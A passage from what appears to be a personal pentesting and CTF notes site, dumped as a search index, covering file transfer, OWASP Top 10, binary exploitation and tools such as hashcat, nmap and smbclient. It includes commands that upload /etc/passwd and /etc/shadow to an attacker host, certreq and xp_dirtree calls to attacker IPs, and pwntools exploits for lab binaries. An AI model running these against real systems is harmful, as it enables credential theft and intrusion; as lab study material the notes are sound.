/dev/tcp/192.168.49.128/443 &gt; SharpKatz.exe # Receive the file   ","version":"Next","tagName":"h2"},{"title":"python​","type":1,"pageTitle":"File transfer","url":"/docs/playbooks/file-transfer#python","content":" Attacker machine runs HTTP(s) server  sudo python3 -m pip install --user uploadserver python3 -m http.server 5555 sudo python3 -m uploadserver 443 --server-certificate /root/server.pem   Target machine uploads file:  curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure   ","version":"Next","tagName":"h2"},{"title":"Self-signed certificate​","type":1,"pageTitle":"File transfer","url":"/docs/playbooks/file-transfer#self-signed-certificate","content":" openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'   ","version":"Next","tagName":"h2"},{"title":"Living off The Land​","type":1,"pageTitle":"File transfer","url":"/docs/playbooks/file-transfer#living-off-the-land","content":" You can abuse of binaries supposed to perform an action to escape from some prohibited binaries. This is same concept as the privilege escalation using GTFObins.  You can use:  https://lolbas-project.github.io/# for windowshttps://gtfobins.github.io/ for Linux  For example, for Windows we can use certreq.exe:  certreq.exe -Post -config http://192.168.49.128/ c:\\windows\\win.ini   For example in Linux, you can abuse openssl:  On attacker:  openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem &lt; /tmp/LinEnum.sh   On target:  openssl s_client -connect 10.10.10.32:80 -quiet &gt; LinEnum.sh  ","version":"Next","tagName":"h2"},{"title":"OWASP Top 10","type":0,"sectionRef":"#","url":"/docs/playbooks/owasp","content":"","keywords":"","version":"Next"},{"title":"Broken Access Control​","type":1,"pageTitle":"OWASP Top 10","url":"/docs/playbooks/owasp#broken-access-control","content":" https://owasp.org/Top10/A01_2021-Broken_Access_Control  Malicious users can manipulate access control mechanisms.  Examples of this are:  Modify the loging cookie to change from regular user to admin userManipulate JWT Tokens...  ","version":"Next","tagName":"h2"},{"title":"Cryptographic Failures​","type":1,"pageTitle":"OWASP Top 10","url":"/docs/playbooks/owasp#cryptographic-failures","content":" https://owasp.org/Top10/A02_2021-Cryptographic_Failures/  Examples of this are:  Using old ciphers in symmetric encryptionUsing short keys for RSA key: able to generate the private key from the public keyUnsalted passwords...  ","version":"Next","tagName":"h2"},{"title":"Injection​","type":1,"pageTitle":"OWASP Top 10","url":"/docs/playbooks/owasp#injection","content":" https://owasp.org/Top10/A03_2021-Injection/  When the user can input some value to the application, the developers should pay extra attention to validate or sanitize it. Otherwise, a malicious user can inject any value on it.  Examples are:  SQL injections: break the SQL query syntax to execute arbitrary queriesOS injections: being able to execute OS commands via the user inputServer-side template injection: abuse a template engine to inject any code...  The injection can be reflected on the screen: the typical use case is for login. You log in with made up username and you see the username back in the UI. This helps a lot because you can test with attack attempts.  If you don't see the results back, you can try 2 things:  Write to a public file: if the target has a public endpoint, you can make the injection to write to a file in that public directory to extract the data.Out of band interaction: if you own a server, you can make the target connect to that server to exfiltrate the dataAbuse of the errors: if you see the stacktrace, you can use it in your favour and throw errors containg the information you want to extract.  ","version":"Next","tagName":"h2"},{"title":"Insecure Design​","type":1,"pageTitle":"OWASP Top 10","url":"/docs/playbooks/owasp#insecure-design","content":" https://owasp.org/Top10/A04_2021-Insecure_Design/  Examples of this are:  Bot detection mechanismCredentials hardcoded in the code...  ","version":"Next","tagName":"h2"},{"title":"Security Misconfiguration​","type":1,"pageTitle":"OWASP Top 10","url":"/docs/playbooks/owasp#security-misconfiguration","content":" https://owasp.org/Top10/A05_2021-Security_Misconfiguration/  This topic is very broad and might include things like:  Default users, passwordsUnprotected paths of the application (remember nginx off-by-slash vulnerability)Stack traces revealing information to the user  ","version":"Next","tagName":"h2"},{"title":"Vulnerable and Outdated Components​","type":1,"pageTitle":"OWASP Top 10","url":"/docs/playbooks/owasp#vulnerable-and-outdated-components","content":" https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components  Using old libraries might cause the application to be vulnerable to new attacks that recent versions of the library fix  When you are exploring this attack vector, check the repository of the library (if open source) and look for commits for the next versions. If you see something looking like a security fix, it's worth trying to replicate it in your setup.  ","version":"Next","tagName":"h2"},{"title":"Identification and Authentication Failures​","type":1,"pageTitle":"OWASP Top 10","url":"/docs/playbooks/owasp#identification-and-authentication-failures","content":" https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/  Examples:  Default/weak passwordAllowing brute force attacks to guess username/password  ","version":"Next","tagName":"h2"},{"title":"Software and Data Integrity Failures​","type":1,"pageTitle":"OWASP Top 10","url":"/docs/playbooks/owasp#software-and-data-integrity-failures","content":" https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/  Application that relies on plugins, libraries, etc.. from third-party must verify the integrity of the component. This also applies to the user input.  If the user can see and modify a serialized payload, that payload should be handled with extra care.  Additionally, CI/CD pipeline must be well secured, otherwise the attackers might modified the shipped software.  ","version":"Next","tagName":"h2"},{"title":"Security Logging and Monitoring Failures​","type":1,"pageTitle":"OWASP Top 10","url":"/docs/playbooks/owasp#security-logging-and-monitoring-failures","content":" https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures  Not enough monitoring for scenarios like excessive number of failed login attemps, etc...  ","version":"Next","tagName":"h2"},{"title":"Server-Side Request Forgery (SSRF)​","type":1,"pageTitle":"OWASP Top 10","url":"/docs/playbooks/owasp#server-side-request-forgery-ssrf","content":" https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29  This happens when an application fetches a resource from a third-pary based on the input provided by a user.  For instance, in a template engine, the legitimate users might include an image stored in their webserver. However, an attacker might include their own crafted version of the image that includes malicious code. ","version":"Next","tagName":"h2"},{"title":"johntheripper","type":0,"sectionRef":"#","url":"/docs/tooling/john-the-ripper","content":"johntheripper https://github.com/openwall/john Password cracking tool. It does not do anything magic, it just compares a hash file with a list of words (dictionary). It has a quite decent default dictionary, however, you can search for more complete dictionaries such as the rock-you.txt Make sure to install a version &gt;= 1.9.0, which enables support for many hash formats. In my case for 1.8.0 version I couldn't crack a NTLMv2 hash. You can also use zip2john tool to brute-force zip files with passwords. You can specify the format as well: john --format=raw-md5 passwd.txt You can determine the type of hash by running hashid and then check with: john --list=formats ","keywords":"","version":"Next"},{"title":"gobuster","type":0,"sectionRef":"#","url":"/docs/tooling/gobuster","content":"gobuster https://github.com/OJ/gobuster gobuster performs dir busting on a web server. It discovers available paths using a word list. The following examples checks all the words in /usr/share/dict/american-english-small dictionary and searches for paths with php extensions and stores the results in /tmp/found and uses 20 threads: gobuster -x php -u http://&lt;ip&gt; -w /usr/share/dict/american-english-small -o /tmp/found -t 20 gobuster can also perform sub-domain enumeration (by dns records or by virtual host) e.g: gobuster vhost --url http://thetoppers.htb -w /usr/share/workdlists/subdomains-top1million-5000.txt -t 50 --append-domain Consider using different wordlist for subdomains and for directories","keywords":"","version":"Next"},{"title":"ftp","type":0,"sectionRef":"#","url":"/docs/tooling/ftp","content":"ftp Stands for File transfer protocol. It listens on port 21 by deault and is unencrypted (the secure version is called sftp) The first thing to try while trying to access ftp is user anonymous whitout password. Commands: ls: list directory contentspass: set passive modeget: retrieve file to computer Examples ftp &lt;ip&gt; Connected to &lt;ip&gt;. 220 (vsFTPd 3.0.3) Name (&lt;ip&gt;:gal): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp&gt; ls 500 Illegal PORT command. ftp: bind: Address already in use ftp&gt; pass Passive mode on. ftp&gt; ls 227 Entering Passive Mode (10,129,103,239,82,68). 150 Here comes the directory listing. -rw-r--r-- 1 0 0 32 Jun 04 2021 flag.txt 226 Directory send OK. ftp&gt; get flag.txt /tmp/flag.txt local: /tmp/flag.txt remote: flag.txt 227 Entering Passive Mode (10,129,103,239,159,232). 150 Opening BINARY mode data connection for flag.txt (32 bytes). 226 Transfer complete. 32 bytes received in 0.00 secs (21.1291 kB/s) in order to use the ls command, we need to set the Passive mode by issuing the pass command Download all contents of ftp-server: wget -m ftp://username:password@ip.of.old.host To see hidden files: ls -la ","keywords":"","version":"Next"},{"title":"hashcat","type":0,"sectionRef":"#","url":"/docs/tooling/hashcat","content":"hashcat Determine type of hash: hashcat exfil/hash.txt ... # | Name | Category ======+============================================================+====================================== 3200 | bcrypt $2*$, Blowfish (Unix) | Operating System 25600 | bcrypt(md5($pass)) / bcryptmd5 | Forums, CMS, E-Commerce 25800 | bcrypt(sha1($pass)) / bcryptsha1 | Forums, CMS, E-Commerce 28400 | bcrypt(sha512($pass)) / bcryptsha512 | Forums, CMS, E-Commerce -m defines the type of hash -a 0 means dictionary attack hashcat exfil/hash.txt -m 3200 -a 0 /usr/share/wordlists/rockyou.txt ","keywords":"","version":"Next"},{"title":"netcat","type":0,"sectionRef":"#","url":"/docs/tooling/netcat","content":"netcat Listen on 1234 port: nc -lnvp 1234 -l : Listen mode -n: numeric-only IP addresses, no dns -v: verbose -p: port - we can add p to say that we want to listen on a specific port (here 1234)","keywords":"","version":"Next"},{"title":"responder","type":0,"sectionRef":"#","url":"/docs/tooling/responder","content":"responder https://github.com/lgandx/Responder For getting NTLM password, responder tool will setup a rogue SMB server that will capture the challenge initiated by another machine in the network and store the hash of the challenge. Later you can use hashcat or john to try to go from hash to password. sudo responder -I tun0 ","keywords":"","version":"Next"},{"title":"Reversing","type":0,"sectionRef":"#","url":"/docs/playbooks/reversing","content":"","keywords":"","version":"Next"},{"title":"Buffer overflow​","type":1,"pageTitle":"Reversing","url":"/docs/playbooks/reversing#buffer-overflow","content":" In order to understand this attack, first we need to understand how the memory works in the computers.  We first need to understand that memory has the following regions:  Memory section\tDescriptionStack\tstores function local variables and information about function calls: return address, arguments, etc.. Heap\tstores the dynamic memory. Used by malloc, etc... BSS\tstores the uninitialized static/global variables Data\tstores the static/global variables Text\tread only, stores the executable code  Inside the stack, a new stack frame is created for every function execution. Inside a stack frame, we can see:  Stack frame section\tDescriptionFunction arguments Return address\twhere to go when the execution ends Previous frame pointer\tto know what is the stack frame of the function calling this function Local variables\t  Take this functions as example:  #include &lt;string.h&gt; void foo(char *str) { char buffer[12]; /* The following statement will result in buffer overflow */ strcpy(buffer, str); } int main() { char *str = &quot;This is definitely longer than 12&quot;; foo(str); return 1; }   The stack frame for foo() will look like this:  Stack frame section\tValueFunction arguments\tstr (pointer) Return address Previous frame pointer Local variables\tbuffer[11] ... buffer[1]  In this case, we can keep adding data into the buffer until we reach the memory address of the return address. Then, we can tell the program to jump to any function that we want.  Knowing that, buffer overflow technique consists in three stages:  ","version":"Next","tagName":"h2"},{"title":"Overflow the stack pointer​","type":1,"pageTitle":"Reversing","url":"/docs/playbooks/reversing#overflow-the-stack-pointer","content":" When a function does not limit the input characters, it can happen that the user inputs more bytes than the expected, e.g: gets function:  void vuln(void) { char local_bc [180]; gets(local_bc); puts(local_bc); return; }   In this case, if the user inputs 200 chars, the program will fail with segmentation fault and the data will be injected in some unknown region of the stack.  ","version":"Next","tagName":"h3"},{"title":"Reach to the return address​","type":1,"pageTitle":"Reversing","url":"/docs/playbooks/reversing#reach-to-the-return-address","content":" Knowing that the function is vulnerable to buffer overflow, we can craft a special payload that change the return address to make it jump where we want.  In order to do this, the first thing we need to do is find the offset on the input data in order to write to the return address.  Using ghidra we can find easily the value of the return function as it will be the next instruction just after the invocation to our target function, so you will need to calculate the payload using those values.  You can do it in a less manual way using gdb-peda:  Knowing that the buffer has 180 chars, let's suppose that will 200 chars will overflow it, let's create a pattern of 200 chars:  pattern_create 200 bof.txt  and input it to the program:  r &lt; pattern.txt  When the program crashes, we'll see the registers:  You know who are 0xDiablos: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA Program received signal SIGSEGV, Segmentation fault. [----------------------------------registers-----------------------------------] EAX: 0xc9 EBX: 0x76414158 ('XAAv') ECX: 0xf7fa09b4 --&gt; 0x0 EDX: 0x1 ESI: 0xffffcf94 --&gt; 0xffffd165 (&quot;/home/gal/workspace/hack-the-box/boxes/you-know-0x-diables/vuln&quot;) EDI: 0xf7ffcb80 --&gt; 0x0 EBP: 0x41594141 ('AAYA') ESP: 0xffffceb0 (&quot;ZAAxAAyA&quot;) EIP: 0x41417741 ('AwAA') EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] Invalid $PC address: 0x41417741 [------------------------------------stack-------------------------------------] 0000| 0xffffceb0 (&quot;ZAAxAAyA&quot;) 0004| 0xffffceb4 (&quot;AAyA&quot;) 0008| 0xffffceb8 --&gt; 0xf7fbeb00 --&gt; 0xf7d8fcd4 (&quot;GCC_3.0&quot;) 0012| 0xffffcebc --&gt; 0x3e8 0016| 0xffffcec0 --&gt; 0xffffcee0 --&gt; 0x1 0020| 0xffffcec4 --&gt; 0xf7f9f000 --&gt; 0x229dac 0024| 0xffffcec8 --&gt; 0xf7ffd020 --&gt; 0xf7ffda40 --&gt; 0x0 0028| 0xffffcecc --&gt; 0xf7d96519 --&gt; 0x8310c483 [------------------------------------------------------------------------------] Legend: code, data, rodata, value 0x41417741 in ?? ()   The interesting one is EIP as it is the register that points to the next instruction. Note that if you change the payload, the value of the EIP pointer will change as well.  Now, we can use pattern_offset to obtain exactly the number of characters to reach to Return address:  gdb-peda$ pattern_offset 0x41417741 1094809409 found at offset: 188   Now we know that if we write exactly 188 chars, the next content will be written to the return address and we can make the program jump to where we want.  ","version":"Next","tagName":"h3"},{"title":"Write the exploit​","type":1,"pageTitle":"Reversing","url":"/docs/playbooks/reversing#write-the-exploit","content":" In the case I'm working on the exploit just need to call another function in the code. In order to so, I'll use python pwntools which helps a lot on these kind of things.  from pwn import * context.update(arch=&quot;i386&quot;, os=&quot;linux&quot;) elf = ELF(&quot;./vuln&quot;) # offset to reach right before return address's location offset = b&quot;A&quot; * 188 # craft exploit: offset + flag() + padding + parameter 1 + parameter 2 exploit = offset + p32(elf.symbols['flag'], endian=&quot;little&quot;) + p32(0x90909090) + p32(0xdeadbeef, endian=&quot;little&quot;) + p32(0xc0ded00d, endian=&quot;little&quot;) r = elf.process() r.sendlineafter(&quot;:&quot;, exploit) r.interactive()   Remember that we are jumping to flag() using RET. This means flag() will think itself have a return address. Therefore, we should pad with any 4 bytes of content before we write the 2 parameters.  ","version":"Next","tagName":"h3"},{"title":"Obfuscated code​","type":1,"pageTitle":"Reversing","url":"/docs/playbooks/reversing#obfuscated-code","content":" Sometimes, when trying to reverse the code, you might see strings that look very odd, e.g:  3734203635203636203132322036352036382034382036352037342031  This might be some string buf obfuscated somehow. So far, I found this kind of simple de-obfuscation (the plan is to keep updating this with more obfuscation techniques):  ","version":"Next","tagName":"h2"},{"title":"Hex to DEC > DEC to char > decode all string in base64​","type":1,"pageTitle":"Reversing","url":"/docs/playbooks/reversing#hex-to-dec--dec-to-char--decode-all-string-in-base64","content":" import binascii import base64 def dec_to_chr(str): return &quot;&quot;.join([chr(int(s)) for s in str.decode('utf-8').split(' ')]) base64text = &quot;&quot; base64text += dec_to_chr(binascii.unhexlify(&quot;3734203635203636203132322036352036382034382036352037342031&quot;) + binascii.unhexlify(&quot;31392036352035312036352036382039392036352037362031303320363520353120363520363820383120363520373620313033&quot;)) base64text += dec_to_chr(binascii.unhexlify(&quot;3635203631&quot;)) print(base64.b64decode(base64text).decode()) $s='77.74.   In this case, this looks like the begining of a script trying to connect to an IP address.  ","version":"Next","tagName":"h3"},{"title":"String format vulnerability​","type":1,"pageTitle":"Reversing","url":"/docs/playbooks/reversing#string-format-vulnerability","content":" Some pieces of unsecure code, will print whatever the user is coding, see:  __isoc99_scanf(&quot;%299s&quot;,local_148); printf(local_148);   If we're a malicious user, can use that piece of code to leak memory addresses from the stack simply by using string format: %p,%p,%p will leak the first three memory positions in the stack: 0x1,0x1,0x7ffff7d14a37  More info here https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/  More possible formats: https://en.wikipedia.org/wiki/Printf_format_string  ","version":"Next","tagName":"h2"},{"title":"Security flags​","type":1,"pageTitle":"Reversing","url":"/docs/playbooks/reversing#security-flags","content":" When a binary is generated, there are some flags that can be setup for security reasons, here are listed. To check it you can use checksec:  gal@gal-Modern-14-C12M:~/workspace/gal/blog$ checksec /usr/bin/ls [*] '/usr/bin/ls' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled   RELRO: If there's no RELRO protection, it means that the Global Object Table (GOT) is writtable. The GOT contains the memory address of the standard library methods. If you can override this, it means that when computer executes puts, an attack can change the table to make it execute arbitrary code.Stack: canary found, it means it hard to crash and gain code execution via buffer overflow.NX: No code execution from the stackPIE: executable is loaded at random address.  More info https://opensource.com/article/21/6/linux-checksec  ","version":"Next","tagName":"h2"},{"title":"ASLR: Address Space Layout Randomisation​","type":1,"pageTitle":"Reversing","url":"/docs/playbooks/reversing#aslr-address-space-layout-randomisation","content":" This is a technique used to avoid memory corruption attacks. In order to prevent an attacker from reliably jumping to, for example, a particular exploited function in memory, ASLR randomly arranges the address space positions of key data areas of a process, including the base of the executable and the positions of the stack, heap and libraries.  In order to check if a exploit is stable and will work even with ASLR enabled, you can enable it in gdb:  gef➤ aslr on [+] Enabling ASLR gef➤ start   ","version":"Next","tagName":"h2"},{"title":"One gadget​","type":1,"pageTitle":"Reversing","url":"/docs/playbooks/reversing#one-gadget","content":" https://github.com/david942j/one_gadget  libc library has some pieces of code that runs a piece of code similar to execve('/bin/sh', NULL, NULL) which will lead to remote code execution.  You can use the one gadget to know exactly the memory address you need to point to achive this RCE.  gal@gal-Modern-14-C12M:~/workspace/hackthebox/spooky-time/challenge$ one_gadget glibc/libc.so.6 0x50a37 posix_spawn(rsp+0x1c, &quot;/bin/sh&quot;, 0, rbp, rsp+0x60, environ) constraints: rsp &amp; 0xf == 0 rcx == NULL rbp == NULL || (u16)[rbp] == NULL 0xebcf1 execve(&quot;/bin/sh&quot;, r10, [rbp-0x70]) constraints: address rbp-0x78 is writable [r10] == NULL || r10 == NULL [[rbp-0x70]] == NULL || [rbp-0x70] == NULL 0xebcf5 execve(&quot;/bin/sh&quot;, r10, rdx) constraints: address rbp-0x78 is writable [r10] == NULL || r10 == NULL [rdx] == NULL || rdx == NULL 0xebcf8 execve(&quot;/bin/sh&quot;, rsi, rdx) constraints: address rbp-0x78 is writable [rsi] == NULL || rsi == NULL [rdx] == NULL || rdx == NULL   For every memory address, it also describe which value the register need to have in order to execute the RCE.  ","version":"Next","tagName":"h2"},{"title":"Overwrite Global Object Table​","type":1,"pageTitle":"Reversing","url":"/docs/playbooks/reversing#overwrite-global-object-table","content":" The global object table is used to dynamically resolve standard library functions (scanf, printf, etc...). If you can modify it, you can alias an arbitrary code as any standard library function. You can use this flaw plus the one gadge tool in the previous section to setup a Remote Code Execution.  Below, you can find an example of how we can override the global object table using the one gadget tool:  from pwn import * context.binary = elf = ELF('./spooky_time') libc = context.binary.libc r = process('./spooky_time') r.sendlineafter(b'scary!\\n\\n', '%3$lx%51$lx') r.recvuntil(b'than \\n') libc.address = int(r.recvn(12), 16) - 1133111 elf.address = int(r.recvn(12), 16) - 5056 libc_one_gadget = libc.address + 0xebcf5 # libc.address + offset computed with one gadget tool fmtstr_payload = fmtstr_payload(8, {elf.got['puts'] : libc_one_gadget}) # we make the function puts point to a RCE r.sendlineafter(b'time..\\n\\n', fmtstr_payload) r.interactive()  ","version":"Next","tagName":"h2"},{"title":"rdp","type":0,"sectionRef":"#","url":"/docs/tooling/rdp","content":"rdp Stands for Remote Desktop Protocol and runs on port 3389. To connect, you can use Windows tool or if in Linux, xfreerdp or any other alternative. xfreerdp /u:htb-student /p:HTB_@cademy_stdnt! /v:10.129.201.55 /timeout:10000 Setting the timeout will help when connection is unstable. If checking a Windows machine, try first the Administrator user. You can mount folder over RDP: xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer To access the directory, we can connect to \\tsclient\\ in the Windows machine. Enable clipboard: +clipboard, e.g: xfreerdp /v:10.129.202.146 /u:htb-student_adm /p:Academy_student_DA! +clipboard /timeout:10000 ","keywords":"","version":"Next"},{"title":"rsync","type":0,"sectionRef":"#","url":"/docs/tooling/rsync","content":"rsync rsync is a tool to share files between Linux machines, it defaults to SSH port (22) or 873. With rsync:// will use 873 port while the form user@host will use the SSH port To list all the rsync shares: rsync --list-only rsync://&lt;ip&gt; public Anonymous Share ","keywords":"","version":"Next"},{"title":"nmap","type":0,"sectionRef":"#","url":"/docs/tooling/nmap","content":"","keywords":"","version":"Next"},{"title":"Scan all​","type":1,"pageTitle":"nmap","url":"/docs/tooling/nmap#scan-all","content":" You can pass the -A flag which enables OS detection, version detection, script scanning, and traceroute, however that is very easy to detect by an IDS/IPS system.  nmap -A &lt;ip&gt;   ","version":"Next","tagName":"h2"},{"title":"Service version detection​","type":1,"pageTitle":"nmap","url":"/docs/tooling/nmap#service-version-detection","content":" To enable only service version detection:  nmap -sV &lt;ip&gt;   -sV flag does scanning and prints service and version on the found open port  To specify the default set of scripts for version identification use -sC  nmap -sC &lt;ip&gt;   ","version":"Next","tagName":"h2"},{"title":"Scan all ports​","type":1,"pageTitle":"nmap","url":"/docs/tooling/nmap#scan-all-ports","content":" To scan all the ports, we need to specify this flags:  namp -p- &lt;ip&gt;   Take into account that this operation will take a long time to complete.  --min-rate speeds up the process by sending packets not slower than X messages per second.  ","version":"Next","tagName":"h2"},{"title":"Firewall evasion​","type":1,"pageTitle":"nmap","url":"/docs/tooling/nmap#firewall-evasion","content":" If nmap reports he has issues because could not determine if port open or closed. The machine might be protected by a firewall, instead of performing a TCP SYN scan, you can use a TCP FIN scan by providing the flag -sF  You can disable ping scan (blocked by firewalls) by disabling host discovery: -Pn.  ","version":"Next","tagName":"h2"},{"title":"Disable DNS resolution​","type":1,"pageTitle":"nmap","url":"/docs/tooling/nmap#disable-dns-resolution","content":" You can disable DNS resolution with -n ","version":"Next","tagName":"h2"},{"title":"smbclient","type":0,"sectionRef":"#","url":"/docs/tooling/smbclient","content":"smbclient Stands for Server Message Block and is a protocol for file sharing between computers. It runs on port 445 by default. The command line tool to interact with it, it's smbclient. To list shared directories (use -N for anonymous access): smbclient -L \\\\&lt;ip&gt; -N Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC WorkShares Disk SMB1 disabled -- no workgroup available Note the \\\\ prefix, this comes from Windows slahes. Make sure to pass the --user flag, otherwise it will try to connect using your Linux user: smbclient -L \\\\10.129.68.251 --user=&quot;Administrator&quot; Password for [WORKGROUP\\Administrator]: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC Now, let's connect to the shared: smbclient \\\\\\\\&lt;ip&gt;\\\\WorkShares Enter WORKGROUP\\gal's password: Try &quot;help&quot; to get a list of possible commands. smb: \\&gt; When you're connected to the smb server you can use the same commands as in FTP. If you see this error: protocol negotiation failed: NT_STATUS_NOT_SUPPORTED, you need to configure min/max protocol versions, see: https://unix.stackexchange.com/questions/562550/smbclient-protocol-negotiation-failed","keywords":"","version":"Next"},{"title":"ms-sql","type":0,"sectionRef":"#","url":"/docs/tooling/ms-sql","content":"ms-sql Connect with impacket-mssqlclient.py: mssqlclient.py manager.htb/operator:operator@dc01.manager.htb -windows-auth Show databases SELECT name, database_id, create_date FROM sys.databases; Show tables SELECT name FROM sys.tables; Check if we have permission to run xp_* EXEC sp_helprotect 'xp_cmdshell' EXEC sp_helprotect 'xp_dirtree' Execute code EXEC xp_cmdshell whoami List files EXEC xp_dirtree '\\\\&lt;attacker_IP&gt;\\any\\thing' EXEC xp_dirtree 'C:\\inetpub\\wwwroot', 1, 1; ","keywords":"","version":"Next"},{"title":"postgres","type":0,"sectionRef":"#","url":"/docs/tooling/postgres","content":"postgres Basic commands (outisde of SQL queries): \\l list databases\\c db connect to a database named db\\dt list tables on given database","keywords":"","version":"Next"},{"title":"mongodb","type":0,"sectionRef":"#","url":"/docs/tooling/mongodb","content":"mongodb MongoDB is a document based (NoSQL) database that runs by default on port 27017. To connect to it, we should use the mongo shell, currently mongosh. To show all the database in the instance, use the show dbs command. To select a database: use &lt;db&gt; To show all the collections in a database use the show collections commands. To show contents of all the documents inside a collection use the db.&lt;collection&gt;.find().pretty(). It will pretty print the results. Example: mongosh &lt;ip&gt; Current Mongosh Log ID: 63999d00a5b1f19a65a9d84b Connecting to: mongodb://&lt;ip&gt;:27017/?directConnection=true&amp;appName=mongosh+1.6.1 Using MongoDB: 3.6.8 Using Mongosh: 1.6.1 For mongosh info see: https://docs.mongodb.com/mongodb-shell/ test&gt; show dbs admin 32.00 KiB config 72.00 KiB local 72.00 KiB sensitive_information 32.00 KiB users 32.00 KiB test&gt; show collections test&gt; use sensitive_information switched to db sensitive_information sensitive_information&gt; show collections flag sensitive_information&gt; db.flag.find().pretty() [ { _id: ObjectId(&quot;630e3dbcb82540ebbd1748c5&quot;), flag: 'flag' } ] sensitive_information&gt; ","keywords":"","version":"Next"},{"title":"powershell","type":0,"sectionRef":"#","url":"/docs/tooling/powershell","content":"","keywords":"","version":"Next"},{"title":"Base64 encode​","type":1,"pageTitle":"powershell","url":"/docs/tooling/powershell#base64-encode","content":" [Convert]::ToBase64String((Get-Content -path &quot;C:\\Windows\\system32\\drivers\\etc\\hosts&quot; -Encoding byte))   ","version":"Next","tagName":"h2"},{"title":"Calculate MD5 hash​","type":1,"pageTitle":"powershell","url":"/docs/tooling/powershell#calculate-md5-hash","content":" Get-FileHash &quot;C:\\Windows\\system32\\drivers\\etc\\hosts&quot; -Algorithm MD5 | select Hash  ","version":"Next","tagName":"h2"},{"title":"rsa-ctf-tool","type":0,"sectionRef":"#","url":"/docs/tooling/rsa-ctf-tool","content":"rsa-ctf-tool https://github.com/RsaCtfTool/RsaCtfTool Is a tool to check/attack RSA keys. I have used it to retrieve a private key from a weak RSA public key. The key pair are generated by multiplying two prime numbers, if the prime numbers are not big enough, they can be guessed and reveal the private key. To decypher the file encrypted with the private key use openssl: openssl rsautl -in flag.enc -out flag.txt -decrypt -inkey key.priv To know the length of the RSA: openssl rsa -in key.pub --RSAPublicKey_in -text -noout openssl rsa -in key.priv -text -noout ","keywords":"","version":"Next"},{"title":"redis","type":0,"sectionRef":"#","url":"/docs/tooling/redis","content":"redis Redis is an in-memory key-value (NoSQL) database running on 6379 port by default To connect to the database, we must use redis-cli: redis-cli -h &lt;ip&gt; Once inside we can retrieve more information by using the info command: &lt;ip&gt;:6379&gt; info # Server redis_version:5.0.7 redis_git_sha1:00000000 redis_git_dirty:0 redis_build_id:66bd629f924ac924 redis_mode:standalone os:Linux 5.4.0-77-generic x86_64 arch_bits:64 To enumerate the database with some entries, we can use the info keyspace command. This information is present in the info response as well. To retrieve all the keys in a given database, we can use the keys * command once we have selected the database. To access a particular key, we use the get command: redis-cli -h &lt;ip&gt; &lt;ip&gt;:6379&gt; select 0 OK &lt;ip&gt;:6379&gt; keys * 1) &quot;numb&quot; 2) &quot;temp&quot; 3) &quot;flag&quot; 4) &quot;stor&quot; &lt;ip&gt;:6379&gt; keys flag 1) &quot;flag&quot; &lt;ip&gt;:6379&gt; get flag &quot;flag&quot; ","keywords":"","version":"Next"},{"title":"wesg","type":0,"sectionRef":"#","url":"/docs/tooling/wesg","content":"wesg https://github.com/bitsadmin/wesng Checks for Windows vulnerabilities given the output of a systeminfo command.","keywords":"","version":"Next"},{"title":"Pentesting","type":0,"sectionRef":"#","url":"/docs/playbooks/pentesting","content":"","keywords":"","version":"Next"},{"title":"Enumeration​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#enumeration","content":" Using nmap the attacker needs to see what is open in the target machine.  At this stage, we'll behave like a legitimate user, e.g.: perform regular searches, etc...  ","version":"Next","tagName":"h2"},{"title":"Web enumeration​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#web-enumeration","content":" If nmap shows some web server, it's worth to check the following enumeration techniques.  Directory brute-foce​  This is a technique to discover all public paths of a website. There might situation where the web server is serving something but it's not referenced anywhere on the website. This is know as well as dir busting.  The technique consist in using a list of words and try all the combinations in the dictionary to see if the web server returns a positive (e.g. 200 OK) answer to the page. If so, we have discovered a page in that path.  There are many tools to perform this such as gobuster and ffuf.  You can use as well the sitemap functionality in the burp suite.  Sub-domain brute force​  This techniques tries to discover sub-domains configured, you can do it by checking the DNS records or the virtual hosts configured in a server.  Usually this works by providing values in the HTTP Host header.  There are many tools to perform this such as gobuster and ffuf.  Robots.txt​  It's always interesting to check the contents of robots.txt, for instance here, the file reveals the server hosts a joomla CMS:  # If the Joomla site is installed within a folder # eg www.example.com/joomla/ then the robots.txt file # MUST be moved to the site root # eg www.example.com/robots.txt # AND the joomla folder name MUST be prefixed to all of the # paths. # eg the Disallow rule for the /administrator/ folder MUST # be changed to read # Disallow: /joomla/administrator/ # # For more information about the robots.txt standard, see: # https://www.robotstxt.org/orig.html User-agent: * Disallow: /administrator/ Disallow: /api/ Disallow: /bin/ Disallow: /cache/ Disallow: /cli/ Disallow: /components/ Disallow: /includes/ Disallow: /installation/ Disallow: /language/ Disallow: /layouts/ Disallow: /libraries/ Disallow: /logs/ Disallow: /modules/ Disallow: /plugins/ Disallow: /tmp/   It also gives an idea of possible paths into the application  Whatweb​  https://github.com/urbanadventurer/WhatWeb  This program will output a list of technologies used in the 